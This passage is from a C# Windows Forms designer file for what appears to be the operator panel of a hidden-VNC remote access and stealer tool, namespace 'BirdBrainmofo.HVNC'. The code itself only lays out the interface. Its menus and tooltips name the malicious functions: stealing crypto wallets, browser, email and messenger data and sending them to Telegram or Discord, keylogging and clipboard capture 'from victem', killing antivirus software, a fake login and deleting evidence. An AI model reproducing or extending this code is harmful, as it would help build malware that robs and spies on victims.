            this.rjCircularPictureBox2 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox1 = new BirdBrainmofo.HVNC.Controls.RJCircularPictureBox();
            this.label37 = new System.Windows.Forms.Label();
            this.label36 = new System.Windows.Forms.Label();
            this.label30 = new System.Windows.Forms.Label();
            this.label29 = new System.Windows.Forms.Label();
            this.label32 = new System.Windows.Forms.Label();
            this.label33 = new System.Windows.Forms.Label();
            this.label34 = new System.Windows.Forms.Label();
            this.label23 = new System.Windows.Forms.Label();
            this.label24 = new System.Windows.Forms.Label();
            this.label26 = new System.Windows.Forms.Label();
            this.label27 = new System.Windows.Forms.Label();
            this.label28 = new System.Windows.Forms.Label();
            this.label22 = new System.Windows.Forms.Label();
            this.label19 = new System.Windows.Forms.Label();
            this.label20 = new System.Windows.Forms.Label();
            this.label21 = new System.Windows.Forms.Label();
            this.label16 = new System.Windows.Forms.Label();
            this.label17 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.label14 = new System.Windows.Forms.Label();
            this.label15 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.txtKeyl = new System.Windows.Forms.RichTextBox();
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.txtClip = new System.Windows.Forms.RichTextBox();
            this.tabPage5 = new System.Windows.Forms.TabPage();
            this.studioButton13 = new System.Windows.Forms.Button();
            this.label31 = new System.Windows.Forms.Label();
            this.label25 = new System.Windows.Forms.Label();
            this.txtlongitude = new System.Windows.Forms.TextBox();
            this.txtlatitude = new System.Windows.Forms.TextBox();
            this.map = new GMap.NET.WindowsForms.GMapControl();
            this.button3 = new System.Windows.Forms.Button();
            this.btnClip = new System.Windows.Forms.Button();
            this.studioButton12 = new System.Windows.Forms.Button();
            this.ShowStart = new System.Windows.Forms.Button();
            this.groupBox6 = new System.Windows.Forms.GroupBox();
            this.IntervalScroll = new System.Windows.Forms.TrackBar();
            this.QualityLabel = new System.Windows.Forms.Label();
            this.IntervalLabel = new System.Windows.Forms.Label();
            this.QualityScroll = new System.Windows.Forms.TrackBar();
            this.btnInfo = new System.Windows.Forms.Button();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
            this.PingStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.contextMenuStrip1.SuspendLayout();
            this.contextMenuStrip2.SuspendLayout();
            this.contextMenuStrip3.SuspendLayout();
            this.contextMenuStrip4.SuspendLayout();
            this.contextMenuStrip5.SuspendLayout();
            this.contextMenuStrip6.SuspendLayout();
            this.contextMenuStrip7.SuspendLayout();
            this.FileManagerContextMenuStrip.SuspendLayout();
            this.primeTheme1.SuspendLayout();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ResizeScroll)).BeginInit();
            this.ambianceTabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.VNCBox)).BeginInit();
            this.tabPage2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox31)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox30)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox29)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox28)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox27)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox26)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox25)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox24)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox23)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox22)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox21)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox20)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox19)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox18)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox17)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox16)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox15)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox14)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox13)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox12)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox9)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox10)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox11)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox6)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox7)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.rjCircularPictureBox1)).BeginInit();
            this.tabPage3.SuspendLayout();
            this.tabPage4.SuspendLayout();
            this.tabPage5.SuspendLayout();
            this.groupBox6.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.IntervalScroll)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.QualityScroll)).BeginInit();
            this.statusStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // timer1
            // 
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.closeToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(68, 26);
            // 
            // closeToolStripMenuItem
            // 
            this.closeToolStripMenuItem.Name = "closeToolStripMenuItem";
            this.closeToolStripMenuItem.Size = new System.Drawing.Size(67, 22);
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(44, 17);
            this.toolStripStatusLabel1.Text = "Statut :";
            // 
            // toolStripStatusLabel2
            // 
            this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
            this.toolStripStatusLabel2.Size = new System.Drawing.Size(26, 17);
            this.toolStripStatusLabel2.Text = "Idle";
            // 
            // timer2
            // 
            this.timer2.Enabled = true;
            this.timer2.Interval = 1000;
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // contextMenuStrip2
            // 
            this.contextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.electrumToolStripMenuItem,
            this.armoryToolStripMenuItem,
            this.GuardaItem,
            this.coinomiToolStripMenuItem,
            this.exodusToolStripMenuItem,
            this.atomicToolStripMenuItem,
            this.jaxxToolStripMenuItem});
            this.contextMenuStrip2.Name = "contextMenuStrip1";
            this.contextMenuStrip2.Size = new System.Drawing.Size(122, 158);
            // 
            // electrumToolStripMenuItem
            // 
            this.electrumToolStripMenuItem.Name = "electrumToolStripMenuItem";
            this.electrumToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.electrumToolStripMenuItem.Text = "Electrum";
            this.electrumToolStripMenuItem.Click += new System.EventHandler(this.electrumToolStripMenuItem_Click);
            // 
            // armoryToolStripMenuItem
            // 
            this.armoryToolStripMenuItem.Name = "armoryToolStripMenuItem";
            this.armoryToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.armoryToolStripMenuItem.Text = "Armory";
            this.armoryToolStripMenuItem.Click += new System.EventHandler(this.armoryToolStripMenuItem_Click);
            // 
            // GuardaItem
            // 
            this.GuardaItem.Name = "GuardaItem";
            this.GuardaItem.Size = new System.Drawing.Size(121, 22);
            this.GuardaItem.Text = "Guarda";
            this.GuardaItem.Click += new System.EventHandler(this.GuardaItem_Click);
            // 
            // coinomiToolStripMenuItem
            // 
            this.coinomiToolStripMenuItem.Name = "coinomiToolStripMenuItem";
            this.coinomiToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.coinomiToolStripMenuItem.Text = "Coinomi";
            this.coinomiToolStripMenuItem.Click += new System.EventHandler(this.coinomiToolStripMenuItem_Click);
            // 
            // exodusToolStripMenuItem
            // 
            this.exodusToolStripMenuItem.Name = "exodusToolStripMenuItem";
            this.exodusToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.exodusToolStripMenuItem.Text = "Exodus";
            this.exodusToolStripMenuItem.Click += new System.EventHandler(this.exodusToolStripMenuItem_Click);
            // 
            // atomicToolStripMenuItem
            // 
            this.atomicToolStripMenuItem.Name = "atomicToolStripMenuItem";
            this.atomicToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.atomicToolStripMenuItem.Text = "Atomic";
            this.atomicToolStripMenuItem.Click += new System.EventHandler(this.atomicToolStripMenuItem_Click);
            // 
            // jaxxToolStripMenuItem
            // 
            this.jaxxToolStripMenuItem.Name = "jaxxToolStripMenuItem";
            this.jaxxToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.jaxxToolStripMenuItem.Text = "Jaxx";
            this.jaxxToolStripMenuItem.Click += new System.EventHandler(this.jaxxToolStripMenuItem_Click);
            // 
            // contextMenuStrip3
            // 
            this.contextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.outlookToolStripMenuItem,
            this.foxmailToolStripMenuItem,
            this.thunderbirdToolStripMenuItem,
            this.skypeToolStripMenuItem,
            this.discordToolStripMenuItem,
            this.telegramToolStripMenuItem,
            this.dingTalkToolStripMenuItem});
            this.contextMenuStrip3.Name = "contextMenuStrip1";
            this.contextMenuStrip3.Size = new System.Drawing.Size(140, 158);
            // 
            // outlookToolStripMenuItem
            // 
            this.outlookToolStripMenuItem.Name = "outlookToolStripMenuItem";
            this.outlookToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.outlookToolStripMenuItem.Text = "Outlook";
            this.outlookToolStripMenuItem.Click += new System.EventHandler(this.outlookToolStripMenuItem_Click_1);
            // 
            // foxmailToolStripMenuItem
            // 
            this.foxmailToolStripMenuItem.Name = "foxmailToolStripMenuItem";
            this.foxmailToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.foxmailToolStripMenuItem.Text = "Foxmail";
            this.foxmailToolStripMenuItem.Click += new System.EventHandler(this.foxmailToolStripMenuItem_Click_1);
            // 
            // thunderbirdToolStripMenuItem
            // 
            this.thunderbirdToolStripMenuItem.Name = "thunderbirdToolStripMenuItem";
            this.thunderbirdToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.thunderbirdToolStripMenuItem.Text = "Thunderbird";
            this.thunderbirdToolStripMenuItem.Click += new System.EventHandler(this.thunderbirdToolStripMenuItem_Click_1);
            // 
            // skypeToolStripMenuItem
            // 
            this.skypeToolStripMenuItem.Name = "skypeToolStripMenuItem";
            this.skypeToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.skypeToolStripMenuItem.Text = "Skype";
            this.skypeToolStripMenuItem.Click += new System.EventHandler(this.skypeToolStripMenuItem_Click);
            // 
            // discordToolStripMenuItem
            // 
            this.discordToolStripMenuItem.Name = "discordToolStripMenuItem";
            this.discordToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.discordToolStripMenuItem.Text = "Discord";
            this.discordToolStripMenuItem.Click += new System.EventHandler(this.discordToolStripMenuItem_Click);
            // 
            // telegramToolStripMenuItem
            // 
            this.telegramToolStripMenuItem.Name = "telegramToolStripMenuItem";
            this.telegramToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.telegramToolStripMenuItem.Text = "Telegram";
            this.telegramToolStripMenuItem.Click += new System.EventHandler(this.telegramToolStripMenuItem_Click);
            // 
            // dingTalkToolStripMenuItem
            // 
            this.dingTalkToolStripMenuItem.Name = "dingTalkToolStripMenuItem";
            this.dingTalkToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.dingTalkToolStripMenuItem.Text = "DingTalk";
            this.dingTalkToolStripMenuItem.Click += new System.EventHandler(this.dingTalkToolStripMenuItem_Click);
            // 
            // contextMenuStrip4
            // 
            this.contextMenuStrip4.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.btnChrome,
            this.btnEdge,
            this.btnFirefox,
            this.btnBrave,
            this.btnEpic,
            this.btnVivaldi,
            this.btn360,
            this.btnSputnik,
            this.comodoToolStripMenuItem,
            this.yandexToolStripMenuItem,
            this.operaNeonToolStripMenuItem,
            this.waterFoxToolStripMenuItem,
            this.orbitumToolStripMenuItem,
            this.atomToolStripMenuItem,
            this.slimjetToolStripMenuItem});
            this.contextMenuStrip4.Name = "contextMenuStrip1";
            this.contextMenuStrip4.Size = new System.Drawing.Size(139, 334);
            // 
            // btnChrome
            // 
            this.btnChrome.Name = "btnChrome";
            this.btnChrome.Size = new System.Drawing.Size(138, 22);
            this.btnChrome.Text = "Chrome";
            this.btnChrome.Click += new System.EventHandler(this.btnChrome_Click);
            // 
            // btnEdge
            // 
            this.btnEdge.Name = "btnEdge";
            this.btnEdge.Size = new System.Drawing.Size(138, 22);
            this.btnEdge.Text = "Edge";
            this.btnEdge.Click += new System.EventHandler(this.btnEdge_Click);
            // 
            // btnFirefox
            // 
            this.btnFirefox.Name = "btnFirefox";
            this.btnFirefox.Size = new System.Drawing.Size(138, 22);
            this.btnFirefox.Text = "Firefox";
            this.btnFirefox.Click += new System.EventHandler(this.btnFirefox_Click);
            // 
            // btnBrave
            // 
            this.btnBrave.Name = "btnBrave";
            this.btnBrave.Size = new System.Drawing.Size(138, 22);
            this.btnBrave.Text = "Brave";
            this.btnBrave.Click += new System.EventHandler(this.btnBrave_Click);
            // 
            // btnEpic
            // 
            this.btnEpic.Name = "btnEpic";
            this.btnEpic.Size = new System.Drawing.Size(138, 22);
            this.btnEpic.Text = "Epic";
            this.btnEpic.Click += new System.EventHandler(this.btnOpera_Click);
            // 
            // btnVivaldi
            // 
            this.btnVivaldi.Name = "btnVivaldi";
            this.btnVivaldi.Size = new System.Drawing.Size(138, 22);
            this.btnVivaldi.Text = "Vivaldi";
            this.btnVivaldi.Click += new System.EventHandler(this.btnVivaldi_Click);
            // 
            // btn360
            // 
            this.btn360.Name = "btn360";
            this.btn360.Size = new System.Drawing.Size(138, 22);
            this.btn360.Text = "360";
            this.btn360.Click += new System.EventHandler(this.btn360_Click);
            // 
            // btnSputnik
            // 
            this.btnSputnik.Name = "btnSputnik";
            this.btnSputnik.Size = new System.Drawing.Size(138, 22);
            this.btnSputnik.Text = "Sputnik";
            this.btnSputnik.Click += new System.EventHandler(this.btnSputnik_Click);
            // 
            // comodoToolStripMenuItem
            // 
            this.comodoToolStripMenuItem.Name = "comodoToolStripMenuItem";
            this.comodoToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.comodoToolStripMenuItem.Text = "Comodo";
            this.comodoToolStripMenuItem.Click += new System.EventHandler(this.comodoToolStripMenuItem_Click);
            // 
            // yandexToolStripMenuItem
            // 
            this.yandexToolStripMenuItem.Name = "yandexToolStripMenuItem";
            this.yandexToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.yandexToolStripMenuItem.Text = "Yandex";
            this.yandexToolStripMenuItem.Visible = false;
            this.yandexToolStripMenuItem.Click += new System.EventHandler(this.yandexToolStripMenuItem_Click);
            // 
            // operaNeonToolStripMenuItem
            // 
            this.operaNeonToolStripMenuItem.Name = "operaNeonToolStripMenuItem";
            this.operaNeonToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.operaNeonToolStripMenuItem.Text = "Opera Neon";
            this.operaNeonToolStripMenuItem.Click += new System.EventHandler(this.operaNeonToolStripMenuItem_Click);
            // 
            // waterFoxToolStripMenuItem
            // 
            this.waterFoxToolStripMenuItem.Name = "waterFoxToolStripMenuItem";
            this.waterFoxToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.waterFoxToolStripMenuItem.Text = "WaterFox";
            this.waterFoxToolStripMenuItem.Click += new System.EventHandler(this.waterFoxToolStripMenuItem_Click);
            // 
            // orbitumToolStripMenuItem
            // 
            this.orbitumToolStripMenuItem.Name = "orbitumToolStripMenuItem";
            this.orbitumToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.orbitumToolStripMenuItem.Text = "Orbitum";
            this.orbitumToolStripMenuItem.Click += new System.EventHandler(this.orbitumToolStripMenuItem_Click);
            // 
            // atomToolStripMenuItem
            // 
            this.atomToolStripMenuItem.Name = "atomToolStripMenuItem";
            this.atomToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.atomToolStripMenuItem.Text = "Atom";
            this.atomToolStripMenuItem.Click += new System.EventHandler(this.atomToolStripMenuItem_Click);
            // 
            // slimjetToolStripMenuItem
            // 
            this.slimjetToolStripMenuItem.Name = "slimjetToolStripMenuItem";
            this.slimjetToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.slimjetToolStripMenuItem.Text = "Slimjet";
            this.slimjetToolStripMenuItem.Click += new System.EventHandler(this.slimjetToolStripMenuItem_Click);
            // 
            // contextMenuStrip5
            // 
            this.contextMenuStrip5.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.msinfo32exeToolStripMenuItem,
            this.mstscexeToolStripMenuItem,
            this.notepadToolStripMenuItem,
            this.controlPanelToolStripMenuItem,
            this.powershellToolStripMenuItem,
            this.cMDToolStripMenuItem,
            this.explorerToolStripMenuItem,
            this.copyToolStripMenuItem,
            this.pasteToolStripMenuItem,
            this.fakeLoginToolStripMenuItem,
            this.killAllAntivusesToolStripMenuItem});
            this.contextMenuStrip5.Name = "contextMenuStrip1";
            this.contextMenuStrip5.Size = new System.Drawing.Size(162, 246);
            // 
            // msinfo32exeToolStripMenuItem
            // 
            this.msinfo32exeToolStripMenuItem.Name = "msinfo32exeToolStripMenuItem";
            this.msinfo32exeToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.msinfo32exeToolStripMenuItem.Text = "msinfo32.exe";
            this.msinfo32exeToolStripMenuItem.Click += new System.EventHandler(this.msinfo32exeToolStripMenuItem_Click);
            // 
            // mstscexeToolStripMenuItem
            // 
            this.mstscexeToolStripMenuItem.Name = "mstscexeToolStripMenuItem";
            this.mstscexeToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.mstscexeToolStripMenuItem.Text = "mstsc.exe";
            this.mstscexeToolStripMenuItem.Click += new System.EventHandler(this.mstscexeToolStripMenuItem_Click);
            // 
            // notepadToolStripMenuItem
            // 
            this.notepadToolStripMenuItem.Name = "notepadToolStripMenuItem";
            this.notepadToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.notepadToolStripMenuItem.Text = "Notepad";
            this.notepadToolStripMenuItem.Click += new System.EventHandler(this.notepadToolStripMenuItem_Click);
            // 
            // controlPanelToolStripMenuItem
            // 
            this.controlPanelToolStripMenuItem.Name = "controlPanelToolStripMenuItem";
            this.controlPanelToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.controlPanelToolStripMenuItem.Text = "Control Panel";
            this.controlPanelToolStripMenuItem.Click += new System.EventHandler(this.controlPanelToolStripMenuItem_Click);
            // 
            // powershellToolStripMenuItem
            // 
            this.powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
            this.powershellToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.powershellToolStripMenuItem.Text = "Powershell";
            this.powershellToolStripMenuItem.Click += new System.EventHandler(this.btnPowershell_Click);
            // 
            // cMDToolStripMenuItem
            // 
            this.cMDToolStripMenuItem.Name = "cMDToolStripMenuItem";
            this.cMDToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.cMDToolStripMenuItem.Text = "CMD";
            this.cMDToolStripMenuItem.Click += new System.EventHandler(this.btnCMD_Click);
            // 
            // explorerToolStripMenuItem
            // 
            this.explorerToolStripMenuItem.Name = "explorerToolStripMenuItem";
            this.explorerToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.explorerToolStripMenuItem.Text = "Explorer";
            this.explorerToolStripMenuItem.Click += new System.EventHandler(this.btnEx_Click);
            // 
            // copyToolStripMenuItem
            // 
            this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
            this.copyToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.copyToolStripMenuItem.Text = "Copy ";
            this.copyToolStripMenuItem.Visible = false;
            this.copyToolStripMenuItem.Click += new System.EventHandler(this.btnCopy_Click);
            // 
            // pasteToolStripMenuItem
            // 
            this.pasteToolStripMenuItem.Name = "pasteToolStripMenuItem";
            this.pasteToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.pasteToolStripMenuItem.Text = "Paste";
            this.pasteToolStripMenuItem.Visible = false;
            this.pasteToolStripMenuItem.Click += new System.EventHandler(this.btnPaste_Click);
            // 
            // fakeLoginToolStripMenuItem
            // 
            this.fakeLoginToolStripMenuItem.Name = "fakeLoginToolStripMenuItem";
            this.fakeLoginToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.fakeLoginToolStripMenuItem.Text = "Fake Login";
            this.fakeLoginToolStripMenuItem.Visible = false;
            this.fakeLoginToolStripMenuItem.Click += new System.EventHandler(this.fakeLoginToolStripMenuItem_Click);
            // 
            // killAllAntivusesToolStripMenuItem
            // 
            this.killAllAntivusesToolStripMenuItem.Name = "killAllAntivusesToolStripMenuItem";
            this.killAllAntivusesToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.killAllAntivusesToolStripMenuItem.Text = "Kill All Antivuses";
            this.killAllAntivusesToolStripMenuItem.Click += new System.EventHandler(this.killAllAntivusesToolStripMenuItem_Click);
            // 
            // timer3
            // 
            this.timer3.Enabled = true;
            this.timer3.Interval = 1000;
            this.timer3.Tick += new System.EventHandler(this.timer3_Tick);
            // 
            // contextMenuStrip6
            // 
            this.contextMenuStrip6.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.stealAndSendToTelegramToolStripMenuItem,
            this.stealAndSendToDiscordToolStripMenuItem,
            this.downloadLogsViaSocketToolStripMenuItem,
            this.clearEvidenceToolStripMenuItem,
            this.stealAllWalletsToolStripMenuItem});
            this.contextMenuStrip6.Name = "contextMenuStrip1";
            this.contextMenuStrip6.Size = new System.Drawing.Size(262, 114);
            // 
            // stealAndSendToTelegramToolStripMenuItem
            // 
            this.stealAndSendToTelegramToolStripMenuItem.Name = "stealAndSendToTelegramToolStripMenuItem";
            this.stealAndSendToTelegramToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.stealAndSendToTelegramToolStripMenuItem.Text = "Steal and Send to Telegram/Discord";
            this.stealAndSendToTelegramToolStripMenuItem.Click += new System.EventHandler(this.stealAndSendToTelegramToolStripMenuItem_Click);
            // 
            // stealAndSendToDiscordToolStripMenuItem
            // 
            this.stealAndSendToDiscordToolStripMenuItem.Name = "stealAndSendToDiscordToolStripMenuItem";
            this.stealAndSendToDiscordToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.stealAndSendToDiscordToolStripMenuItem.Text = "Steal and Send to Discord";
            this.stealAndSendToDiscordToolStripMenuItem.Visible = false;
            this.stealAndSendToDiscordToolStripMenuItem.Click += new System.EventHandler(this.stealAndSendToDiscordToolStripMenuItem_Click);
            // 
            // downloadLogsViaSocketToolStripMenuItem
            // 
            this.downloadLogsViaSocketToolStripMenuItem.Name = "downloadLogsViaSocketToolStripMenuItem";
            this.downloadLogsViaSocketToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.downloadLogsViaSocketToolStripMenuItem.Text = "Download Logs via Socket";
            this.downloadLogsViaSocketToolStripMenuItem.ToolTipText = "Before you use this option make sure you run the stealer with option socket!";
            this.downloadLogsViaSocketToolStripMenuItem.Click += new System.EventHandler(this.downloadLogsViaSocketToolStripMenuItem_Click);
            // 
            // clearEvidenceToolStripMenuItem
            // 
            this.clearEvidenceToolStripMenuItem.Name = "clearEvidenceToolStripMenuItem";
            this.clearEvidenceToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.clearEvidenceToolStripMenuItem.Text = "Delete Evidence";
            this.clearEvidenceToolStripMenuItem.Click += new System.EventHandler(this.clearEvidenceToolStripMenuItem_Click);
            // 
            // stealAllWalletsToolStripMenuItem
            // 
            this.stealAllWalletsToolStripMenuItem.Name = "stealAllWalletsToolStripMenuItem";
            this.stealAllWalletsToolStripMenuItem.Size = new System.Drawing.Size(261, 22);
            this.stealAllWalletsToolStripMenuItem.Text = "Steal All Wallets";
            this.stealAllWalletsToolStripMenuItem.Click += new System.EventHandler(this.stealAllWalletsToolStripMenuItem_Click);
            // 
            // chkInfo
            // 
            this.chkInfo.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.chkInfo.BackColor = System.Drawing.Color.Transparent;
            this.chkInfo.Location = new System.Drawing.Point(26, 433);
            this.chkInfo.Name = "chkInfo";
            this.chkInfo.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkInfo.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkInfo.Size = new System.Drawing.Size(50, 19);
            this.chkInfo.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkInfo.TabIndex = 98;
            this.toolTip1.SetToolTip(this.chkInfo, "Get Keylogs from victem!");
            this.chkInfo.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(this.chkInfo_CheckedChanged);
            // 
            // chkKeylog
            // 
            this.chkKeylog.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.chkKeylog.BackColor = System.Drawing.Color.Transparent;
            this.chkKeylog.Location = new System.Drawing.Point(26, 472);
            this.chkKeylog.Name = "chkKeylog";
            this.chkKeylog.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkKeylog.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkKeylog.Size = new System.Drawing.Size(50, 19);
            this.chkKeylog.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkKeylog.TabIndex = 93;
            this.toolTip1.SetToolTip(this.chkKeylog, "Get Keylogs from victem!");
            // 
            // chkClip
            // 
            this.chkClip.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.chkClip.BackColor = System.Drawing.Color.Transparent;
            this.chkClip.Location = new System.Drawing.Point(26, 511);
            this.chkClip.Name = "chkClip";
            this.chkClip.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkClip.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkClip.Size = new System.Drawing.Size(50, 19);
            this.chkClip.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkClip.TabIndex = 96;
            this.toolTip1.SetToolTip(this.chkClip, "Get Clipboard for victem!");
            this.chkClip.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(this.chkClip_CheckedChanged);
            // 
            // studioButton7
            // 
            this.studioButton7.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.studioButton7.BackColor = System.Drawing.Color.Transparent;
            bloom1.Name = "DownGradient1";
            bloom1.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom2.Name = "DownGradient2";
            bloom2.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom3.Name = "NoneGradient1";
            bloom3.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom4.Name = "NoneGradient2";
            bloom4.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom5.Name = "Shine1";
            bloom5.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom6.Name = "Shine2A";
            bloom6.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
